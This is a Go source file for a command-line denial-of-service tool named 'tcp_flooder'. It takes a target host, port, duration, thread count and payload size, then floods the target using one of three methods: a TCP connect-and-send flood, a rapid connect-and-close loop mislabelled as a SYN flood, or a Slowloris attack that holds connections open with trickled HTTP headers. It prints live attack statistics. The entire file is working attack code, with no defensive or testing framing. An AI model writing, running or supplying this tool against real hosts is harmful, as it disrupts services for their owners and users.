package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

var (
	packetsSent     int64
	bytesSent       int64
	connectionsOK   int64
	connectionsFail int64
)

type Config struct {
	Target     string
	Port       int
	Duration   int
	Threads    int
	PacketSize int
	Method     string
}

func main() {
	if len(os.Args) < 7 {
		fmt.Println("Usage: go run tcp_flooder.go <target> <port> <duration> <threads> <packet_size> <method>")
		fmt.Println("Methods:")
		fmt.Println("  flood    - Classic TCP flood (connect + send)")
		fmt.Println("  syn      - SYN flood (connect only)")
		fmt.Println("  slowloris - Slowloris attack (keep connections alive)")
		fmt.Println("\nExample: go run tcp_flooder.go 192.168.1.1 80 60 100 1024 flood")
		os.Exit(0)
	}

	port, _ := strconv.Atoi(os.Args[2])
	duration, _ := strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])
	packetSize, _ := strconv.Atoi(os.Args[5])
	method := os.Args[6]

	config := &Config{
		Target:     os.Args[1],
		Port:       port,
		Duration:   duration,
		Threads:    threads,
		PacketSize: packetSize,
		Method:     method,
	}

	fmt.Printf("[TCP Flooder] Starting attack...\n")
	fmt.Printf("[Target] %s:%d\n", config.Target, config.Port)
	fmt.Printf("[Duration] %d seconds\n", config.Duration)
	fmt.Printf("[Threads] %d\n", config.Threads)
	fmt.Printf("[Packet Size] %d bytes\n", config.PacketSize)
	fmt.Printf("[Method] %s\n", config.Method)
	fmt.Println("---")

	// Start stats logger
	go logStats()

	// Start attack
	var wg sync.WaitGroup
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			
			switch config.Method {
			case "flood":
				floodWorker(config)
			case "syn":
				synWorker(config)
			case "slowloris":
				slowlorisWorker(config)
			default:
				floodWorker(config)
			}
		}()
	}

	// Wait for duration
	time.Sleep(time.Duration(config.Duration) * time.Second)

	fmt.Println("\n[FINAL STATS]")
	printStats()
	os.Exit(0)
}

// Classic flood: connect and send data
func floodWorker(config *Config) {
	target := fmt.Sprintf("%s:%d", config.Target, config.Port)
	payload := generatePayload(config.PacketSize)

	for {
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil {
			atomic.AddInt64(&connectionsFail, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&connectionsOK, 1)
		conn.SetDeadline(time.Now().Add(10 * time.Second))

		// Send packets
		for i := 0; i < 50; i++ {
			n, err := conn.Write(payload)
			if err != nil {
				break
			}
			atomic.AddInt64(&packetsSent, 1)
			atomic.AddInt64(&bytesSent, int64(n))
			time.Sleep(1 * time.Millisecond)
		}

		conn.Close()
		time.Sleep(1 * time.Millisecond)
	}
}

// SYN flood: just connect and close
func synWorker(config *Config) {
	target := fmt.Sprintf("%s:%d", config.Target, config.Port)

	for {
		conn, err := net.DialTimeout("tcp", target, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&connectionsFail, 1)
			continue
		}

		atomic.AddInt64(&connectionsOK, 1)
		atomic.AddInt64(&packetsSent, 1)
		conn.Close()
	}
}

// Slowloris: keep connections alive with slow data
func slowlorisWorker(config *Config) {
	target := fmt.Sprintf("%s:%d", config.Target, config.Port)

	for {
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil {
			atomic.AddInt64(&connectionsFail, 1)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&connectionsOK, 1)

		// Keep connection alive with slow HTTP headers
		go func(c net.Conn) {
			defer c.Close()
			
			// Send incomplete HTTP request
			c.Write([]byte("GET / HTTP/1.1\r\n"))
			c.Write([]byte(fmt.Sprintf("Host: %s\r\n", config.Target)))
			
			// Send headers slowly
			for i := 0; i < 100; i++ {
				header := fmt.Sprintf("X-Header-%d: %s\r\n", i, randomString(10))
				n, err := c.Write([]byte(header))
				if err != nil {
					break
				}
				atomic.AddInt64(&packetsSent, 1)
				atomic.AddInt64(&bytesSent, int64(n))
				time.Sleep(5 * time.Second)
			}
		}(conn)

		time.Sleep(100 * time.Millisecond)
	}
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	
	// Mix of random data and HTTP-like content
	if size > 100 {
		httpHeader := []byte("GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
		copy(payload, httpHeader)
		rand.Read(payload[len(httpHeader):])
	} else {
		rand.Read(payload)
	}
	
	return payload
}

func randomString(length int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func logStats() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		fmt.Print("\033[H\033[2J") // Clear screen
		printStats()
	}
}

func printStats() {
	packets := atomic.LoadInt64(&packetsSent)
	bytes := atomic.LoadInt64(&bytesSent)
	connOK := atomic.LoadInt64(&connectionsOK)
	connFail := atomic.LoadInt64(&connectionsFail)

	mbSent := float64(bytes) / 1024 / 1024
	
	successRate := 0.0
	if connOK+connFail > 0 {
		successRate = float64(connOK) / float64(connOK+connFail) * 100
	}

	fmt.Printf("[%s] Stats:\n", time.Now().Format("15:04:05"))
	fmt.Printf("  Packets Sent: %d\n", packets)
	fmt.Printf("  Data Sent: %.2f MB\n", mbSent)
	fmt.Printf("  Connections OK: %d\n", connOK)
	fmt.Printf("  Connections Failed: %d\n", connFail)
	fmt.Printf("  Success Rate: %.2f%%\n", successRate)
	
	if connOK > 0 {
		fmt.Printf("  Avg Packets/Connection: %.2f\n", float64(packets)/float64(connOK))
	}
}
